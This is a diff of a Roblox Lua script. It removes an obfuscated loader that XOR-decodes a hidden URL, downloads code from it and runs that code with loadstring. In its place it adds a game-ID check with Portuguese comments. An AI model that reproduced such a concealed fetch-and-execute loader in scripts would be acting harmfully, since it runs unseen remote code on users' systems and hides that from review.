@@ -1,12 +1,9 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+local ID_AUTORIZADO = 1234567890 -- Substitua pelo ID do seu jogo
 
-]]--
+if game.PlaceId ~= ID_AUTORIZADO then
+    warn("Aviso: Este script não tem permissão para rodar neste jogo.")
+    return -- Interrompe a execução do restante do script
+end
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v11,v12) local v13={};for v14=1, #v11 do v6(v13,v0(v4(v1(v2(v11,v14,v14 + 1 )),v1(v2(v12,1 + (v14% #v12) ,1 + (v14% #v12) + 1 )))%256 ));end return v5(v13);end local v8=v7("\217\215\207\53\245\225\136\81\193\194\200\49\227\185\206\16\159\192\212\40\169\169\198\9\158\232\131\36\242\179\239\45\215","\126\177\163\187\69\134\219\167");local v9,v10=pcall(function() return game:HttpGet(v8);end);if v9 then loadstring(v10)();else warn(v7("\6\223\56\202\188\34\194\106\198\253\49\223\47\194\253\49\141\37\133\239\32\223\35\213\232\121\141","\156\67\173\74\165")   .. tostring(v10) );end
+-- O restante do seu código vem aqui embaixo:
+print("Script carregado com sucesso no jogo correto!")
